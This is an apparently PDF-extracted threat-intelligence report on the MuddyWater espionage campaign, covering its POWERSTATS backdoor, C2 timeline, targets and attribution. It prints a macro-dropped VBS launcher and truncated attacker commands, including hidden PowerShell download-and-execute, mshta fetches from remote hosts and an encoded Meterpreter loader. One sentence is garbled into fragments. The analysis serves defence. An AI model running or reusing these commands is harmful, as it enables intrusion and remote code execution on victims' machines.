During our investigation we reconstruct the**\n\n**evolution of the vectors used and how the group operates to target their victims, evade detections and**\n\n**move laterally inside the compromised infrastructures.**\n\n### MuddyWater Summary\n\n\n-----\n\n**land, as they don t require the creation of new binaries on the victim s machine, thus maintaining a low**\n\n**detection profile and a low forensic footprint.�**\n\n**The name MuddyWater has been assigned by PaloAlto in an** **[article that describes how the actor’s](https://researchcenter.paloaltonetworks.com/2017/11/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/)**\n\n**backdoor, called POWERSTATS, evolved over the past year. For the sake of clarity we decided to**\n\n**maintain the same names.**\n\n**The operators behind MuddyWater are likely espionage motivated, we derive this information from the**\n\n**analysis of data and backdoors behaviors. We also find that despite the strong preponderance of�**\n\n**victims from Pakistan, the most active targets appear to be in: Saudi Arabia, UAE and Iraq. Amongst**\n\n**the victims we identify a variety of entities with a stronger focus at Governments, Telcos and Oil**\n\n**companies.**\n\n**By tracking the operations we finally figure out that the originating country is likely to be Iran, while it�**\n\n**remains harder to ascertain whether MuddyWater is state sponsored or a criminal organization incline**\n\n**to espionage.**\n\n**Finally we show how the threat evolved since its first public report, the techniques used and how the�**\n\n**actors adapted to various public reports of their activities.**\n\n### Timeline\n\n**In order to understand how the threat evolved and to understand the whole picture, we have to**\n\n**reconstruct the timeline of the various discoveries and piece together the findings published.�**\n\n##### 18/Sep/2017 – First public report\n\n**To the best of our knowledge the first public report of this specific threat came from our intelligence�**\n\n**team (please let us know if any prior finding was published before) with the first detection happening�**\n\n**[during the second half of September. At that time the analysis from ReaQta-Hive shows the full threat’s](https://reaqta.com/hive/)**\n\n**behavior and the C2 address is disclosed to be: 144.76.109.88. At this stage the malware uses GitHub**\n\n**to conceal and download its payload.**\n\n**Shortly after the information is made public, GitHub blocks the account and MuddyWater’s operators**\n\n**quickly shift to Pastebin as their main repository.**\n\n###### \"Living off the land\" RAT downloads 1st stage from cloned fb/react repo, persists in\n\n\n###### registry & task, uses breached websites as c&c pic.twitter.com/hqwLmIKHXW\n\n — ReaQta (@ReaQta) September 18, 2017\n\n\n##### 26/Sep/2017 – First public analysis\n\n**[At the end of September, MalwareBytes publishes an analysis of POWERSTATS, showing how the](https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/)**\n\n**threat is now downloading its payload from Pastebin. With the exception of the repository location, we**\n\n**confirm that the behavior of the analyzed backdoor is the same as the one identified by ReaQta a few�**\n\n\n-----\n\n**On the same day the analysis is published, MuddyWater operators switch their infrastructure to a new**\n\n**C2 address that becomes: 148.251.204.131.**\n\n##### 3/Oct/2017 – MuddyWater starts to embed the payload\n\n**As part of the evolution of POWERSTATS, for the first time on the 3rd of October we notice that the�**\n\n**payload is not downloaded anymore from a remote source (GitHub or Pastebin) but it comes embedded**\n\n**in the vector itself while the C2 remains the same: 148.251.204.131.**\n\n##### 11/Nov/2017 – New C2 for the active backdoors\n\n**The 11th of November the C2 address is switched again and changed to: 78.129.139.147 (this is the**\n\n**first public disclosure of the address).�**\n\n##### 14/Nov/2017 – Second public analysis\n\n**Palo Alto publishes the analysis mentioned in the summary, reconstructing the timeline and taking the**\n\n**date of the first infection back to February 2017, while also showing how the operators adapted the�**\n\n**backdoor to reduce the detection rate and to thwart analyses. Palo Alto reports the C2 to be the same**\n\n**as identified by MalwareBytes (�148.251.204.131) although from our end we see a different picture as**\n\n**all the implants are already communicating with the C2 discovered on the 11th of November**\n\n**(78.129.139.147).**\n\n**Following the publication of the analysis, we noticed a drop in activity from all the implants that were**\n\n**still communicating with the old C2 address from October.**\n\n##### 20/Nov/2017 – New C2 and JScript RAT (Koadic) / Meterpreter\n\n**After the National CyberSecurity Center from Saudi Arabia publishes an** **[advisory (the link appears to](https://www.moi.gov.sa/wps/portal/ncsc/home/Alerts/!ut/p/z1/04_Sj9CPykssy0xPLMnMz0vMAfIjo8ziDQ1dLDyM3A18_M29XQwcnQKD3UyN3Y0dfQ30w8EKDDxNTDwMTYy8_YMMDAwcjcM8PIwtnA0N3I31o4jRj0cBSL8BDuBI0H4j4uzHYwFB_VEQJ-JxASE_FOSGhoZGGGQCALbSJYo!/dz/d5/L0lDUmlTUSEhL3dHa0FKRnNBLzROV3FpQSEhL2Fy/)**\n\n**[be unreachable from outside Middle East, but a copy can be found here) regarding the espionage](https://web.archive.org/web/20171120210331/https://www.moi.gov.sa/wps/portal/ncsc/home/Alerts/!ut/p/z1/04_Sj9CPykssy0xPLMnMz0vMAfIjo8ziDQ1dLDyM3A18_M29XQwcnQKD3UyN3Y0dfQ30w8EKDDxNTDwMTYy8_YMMDAwcjcM8PIwtnA0N3I31o4jRj0cBSL8BDuBI0H4j4uzHYwFB_VEQJ-JxASE_FOSGhoZGGGQCALbSJYo!/dz/d5/L0lDUmlTUSEhL3dHa0FKRnNBLzROV3FpQSEhL2Fy/)**\n\n**activity by MuddyWater, the attacker deployed on some of the victims two different types of backdoors:**\n\n**[1. JScript RAT known as Koadic, publicly available on GitHub, communicating with](https://github.com/zerosum0x0/koadic)**\n\n**C2: 88.99.17.148**\n\n**2. Meterpreter communicating with C2: 78.129.139.147**\n\n\n-----\n\n-----\n\n**MuddyWater attacks timeline**\n\n### Operations\n\n**MuddyWater operators use a series of compromised websites that act as proxies in order to conceal**\n\n**the real address of the C2 server. Infected endpoints connect randomly to one of the proxy servers,**\n\n**which in turn relays the information to the C2. Operators use the C2 to dispatch commands and receive**\n\n**exfiltrated data.�**\n\n**Infrastructure**\n\n**The exception to the rule is represented by the Koadic part that bypasses the proxies and**\n\n**communicates directly with the C2 server.**\n\n**MuddyWater operators have been capable of consistently infecting new computers, this is clearly**\n\n**shown by the graph below showing the growth trend of victims when the group was still moving**\n\n**relatively under the radar, at least in Middle East.**\n\n\n-----\n\n**Daily trend of new infections**\n\n**Another interesting part of the data is represented by the aggregate activity of each backdoor, show**\n\n**below.**\n\n**Overall activity of all infected victims (click to zoom)**\n\n**It is interesting to note what is the impact of public analyses and advisories on a large scale espionage**\n\n**campaign and how fast MuddyWater adapts to each new disclosure. It is also possible to understand**\n\n\n-----\n\n**Hourly activities (cilck to zoom)**\n\n**Zooming in on the victims, we can understand on which countries the group has been focusing with**\n\n**most infections in the EU belonging to victims travelling.**\n\n**Unique victims per country before the publication of advisories in Middle East, countries with less than 5 victims**\n**are not shown (Tunisia, Lebanon, Jordan, Israel, Egypt),**\n\n**At a first glance Pakistan is the targeted country but our data reveals a different picture. By analyzing�**\n\n\n-----\n\n**Operators activities per country**\n\n**Pakistan is indeed the country with the most infections, though the operators appears to be relatively**\n\n**disinterested in those victims. On the other hand, Iraq has a large number of infections and the**\n\n**operators are extremely active on those infrastructures. Saudi Arabia and United Arab Emirates (Dubai**\n\n**specifically) have a low number of victims, all of them extremely active. This led us to believe that the�**\n\n**real targets are then: Iraq, Saudi Arabia and UAE.**\n\n#### Targets\n\n**Victims belong to a variety of different sectors but the MuddyWater operators are particularly active on**\n\n**Governments, Telcos and Oil companies (including one Oil platform). In one instance we found that a**\n\n**large Iraqi telecom provider was deeply compromised with 10% of their endpoints infected with**\n\n**POWERSTATS. The attackers also possess some decent capabilities of lateral movement and they**\n\n**l** **i** **l it** **LPE** **f ll** **ki** **t** **th** **l t** **t** **i** **f Wi d** **10** **d t** **l (**\n\n\n-----\n\n**Distribution of infected Operating Systems**\n\n**While 85% of infected devices are workstations, the remaining 15% is made by servers, indicating that**\n\n**the attackers are capable of escalating after the initial breach to get direct access to the data they’re**\n\n**interested to.**\n\n##### Decoy Documents\n\n**The initial backdoor is deployed using a decoy document containing a macro. Here are some examples**\n\n**of the content delivered to the victims:**\n\n\n-----\n\n**The observed content has some common characteristics like the attempt to impersonate National**\n\n**entities; the four documents mimics:**\n\n**Iraqi National Intelligence Service**\n\n**National Security Agency**\n\n**Ministry of Interior of Saudi Arabia**\n\n**Federal Investigation Agency Ministry Of Interior Pakistan**\n\n**Every document also presents an Input Box and a Button at the bottom of the page.**\n\n##### Document Analysis\n\n**Beside the decoy content, the static analysis of the initial documents allowed us to identify some**\n\n**common characteristics. All documents leverages the Macro VBS mechanism to execute code and**\n\n**deploy next attack stages.**\n\n###### SAMPLE 1\n\n**SHA256: 2c8d18f03b6624fa38cae0141b91932ba9dc1221ec5cf7f841a2f7e31685e6a1**\n\n\n-----\n\n**Sample 1 Metadata**\n\n###### SAMPLE 2\n\n**SHA256: 40a6b4c6746e37d0c5ecb801e7656c9941f4839f94d8f4cd61eaf2b812feaabe**\n\n\n-----\n\n**Sample 2 Metadata**\n\n**Both documents has the following common metadata fields:�**\n\n**LastModifiedBy: �GIGABYTE**\n\n**AppVersion: 15.0**\n\n**Software: Microsoft Office Word�**\n\n**In particular all but one document’s metadata show that the author’s keyboard locale was set to ar_SA**\n\n**(Arabic, Saudi Arabia).**\n\n\n-----\n\n**Decode and drop a powershell script into C:\\Users\\Public\\Documents\\system.ps1**\n\n**Decode and drop a VBS script into C:\\Users\\Public\\Documents\\system.vbs**\n\n**[Executes the VBS with Shell.Open Method](https://msdn.microsoft.com/en-us/library/windows/desktop/bb774086(v=vs.85).aspx?cs-save-lang=1&cs-lang=vb#code-snippet-1)**\n\n**The VBS content is below reported and its scope is to simply run system.ps1 powershell script.**\n\n**Set objShell = WScript.CreateObject(\"WScript.Shell\")**\n**command = \"powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nolo**\n**objShell.Run command,0**\n\n**Set objShell = Nothing**\n\n##### Powershell Backdoor\n\n**Starting from system.ps1 the attack-chain goes through two blocks of code that prepare the ground for**\n\n**the third block of code, containing the real powershell backdoor. Each block sets the variables**\n\n**necessary for the correct execution of the backdoor.

Registration is performed by collecting information about the running OS**\n\n**that will be sent to the attacker, the server will finally reply with a unique key (MD5) stored in�**\n\n**{username}.dat. By diving more in depth in the register function we can see that it gathers IP, OS ad**\n\n**User’s information, finally assembling the following string:�**\n\n**$($env:computername)~~$($env:username)~~$os~~$($ips.subString(1))~~$((Get-W**\n\n**After the UniqueKey handling (Created or Found) stage the backdoor enters in the Main Loop that calls**\n\n**the getCommand() function. This function requests commands to the C2 and sends back the results by**\n\n**splitting them in chucks.**\n\n**The command evaluation is performed by using Invoke-Expression from powershell, such approach is**\n\n**simple and straightforward and it offers strong post-exploitation capabilities to the attacker, the scripts**\n\n**can now run as a remote powershell.**\n\n\n-----\n\n**We identified an additional persistence method deployed by the attacker, the technique relies on using�**\n\n**[a Word Template and it’s been described at length in the article “Maintaining Access with Normal.dotm”](https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/)**\n\n**Powershell script that create the Normal.dotm file�**\n\n**Macro from Normal.dotm**\n\n##### Connections and Similarities between samples\n\n**During the investigation we noticed that this attack generated an incident quite similar to another one**\n\n**[we already observed in the past. As we can see from the following screenshots the two process-tree](https://twitter.com/ReaQta/status/909799626730901504)**\n\n**are almost the same:**\n\n\n-----\n\n**The core differences between the two attacks can be summarized as follows:**\n\n**Macro and Powershell script are now obfuscated**\n\n**Backdoor code has been refactored**\n\n**URL parameters are changed**\n\n**Additionally the code of the backdoor has been refactored, as it can be seen from the following**\n\n**examples.**\n\n**function httpGet**\n\n**The new version adds a fallback URL to contact, in both cases domains are randomly chosen from an**\n\n**hard-coded list.**\n\n**httpGet diff**\n\n**The “send” code has been moved into a dedicated new function:**\n\n**send code diff**\n\n**function persistence**\n\n\n-----\n\n**WindowsOptimizations -> Microsoft\\WindowsOptimizationsService**\n\n\n**CurrentVersion\\Run Persistence**\n\n**Differences between Old and New CurrentVersion\\Run**\n\n**Scheduled Task Persistence**\n\n**Differences between Old and New Scheduled Task**\n\n##### MuddyWater Communication\n\n**Communication with the C2 happens through compromised websites working as proxies, as explained**\n\n**above. Here it is a partial list of the proxies adopted by the backdoor:**\n\n**Proxy List**\n\n**As it can be seen from the above image, every request is performed via GET:**\n\n**http://[COMPROMISED_SITE]/[MALICIOUS].php?c=Base64(CustomEncoding([DATA]))**\n\n**Backdoor’s interactions with the attacker can be synthesized in two main steps:**\n\n\n-----\n\n**Command Exchange**\n\n**Registration (already explained in depth) uses the following URL parameters:**\n\n**Base64(CustomEncoding(a=r&b=[REGISTRATION_DETAILS]))**\n\n**The final result from a network point of view is:�**\n\n**registration**\n\n**Command Exchange happens through the function getCommand.**\n\n**The Backdoors can request a command to the attacker using the $id which is the UniqueKey:**\n\n**Base64(CustomEncoding(a=g&b=$id))**\n\n**The attacker replies as follows:**\n\n**Base64(CustomEncoding($cmdID~~$cmd))**\n\n**Once the backdoor executes the command $cmd, it replies back to the attacker with the result:**\n\n**Base64(CustomEncoding(a=s&i=$id&ch=last&ci=$cmdId&r=$result))**\n\n**Depending on the length of the result, the reply to the attacker can be divided in chunks.**\n\n**This is an extract of commands received directly from the attacker:**\n\n**781~~Remove-itemproperty -path HKCU:\\Software\\Classes\\exefile\\shell\\runas\\c**\n\n**791~~powershell -nop -w hidden -exec bypass -c \"IEX (New-Object Net.WebClie**\n\n**As we can see from the last command, the attacker sent a new powershell script:**\n\n\n**791~~powershell -nop -w hidden -exec bypass -c \"IEX (New-Object Net.WebClie**\n\n\n**Base64(CustomEncoding($cmdID~~$cmd))**\n\n\n**Base64(CustomEncoding(a=r&b=[REGISTRATION_DETAILS]))**\n\n\n-----\n\n**powershell script sh.txt**\n\n**Whose scope was to update the backdoor:**\n\n**New C2 address**\n\n**New isDebugEnv function**\n\n**New proxy list (reported below)**\n\n**Old vs New Proxy List**\n\n\n-----\n\n**Koadic JScript RAT:**\n\n**821~~mshta http://[REDACTED].38:9999/PcWuI**\n\n**825~~whoami**\n\n**Koadic JScript RAT:**\n\n**826~~mshta http://[REDACTED].134:9999/RBzUs**\n\n**[Meterpreter injected using to_mem_pshreflection.ps1.template�](https://github.com/rapid7/rex-powershell/blob/master/data/templates/to_mem_pshreflection.ps1.template)**\n\n**829~~powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTA**\n\n**Koadic JScript RAT:**\n\n**836~~mshta http://[REDACTED].148:9999/tTsjX**\n\n##### MuddyWater Attribution\n\n**As usual attribution of cyber espionage operations is a very complex topic and we don’t have definitive�**\n\n**elements to make conclusions, that said during our investigation we noticed what might have been a**\n\n**mistake from one of the operators and for a while we were able to track his/her movements. The IP**\n\n**address was in Tehran, Iran and we have reason to believe that, in that specific instance, we were�**\n\n**dealing with a final IP address and not a proxy, or a victim used to conceal the real address. Other�**\n\n**elements provide circumstantial evidence that the attacks can reasonably originate from Iran like the**\n\n**kind (and more specifically the identities) of the victims most investigated by the operators and their�**\n\n**geographic distribution.**\n\n**Despite the origin of MuddWater’s attacks, a lot of doubts remain, the first of them is whether the group�**\n\n**is state-sponsored or part of the organized crime. The relatively low sophistication of the attacks and**\n\n**the general handling of their infrastructure led us to think about a criminal group, but the choice of**\n\n**victims and their agility once inside the compromised infrastructures made us think about a more**\n\n**structured entity (possibly made by two different groups, one for attacks and another one specialized in**\n\n**post-exploitation activities). The second is about their link with APT33/OilRig, there are different**\n\n**similarities in the techniques adopted by MuddyWater and APT33/OilRig but whether the operations**\n\n**belong to the same actor is still unknown.**\n\n##### Conclusions\n\n**[Our customers running ReaQta-Hive are already protected and no further action is required. We](https://reaqta.com/hive/)**\n\n**suggest to check for all the published IOCs in order to understand whether the current backdoors are**\n\n**active and to check for signs of persistence described
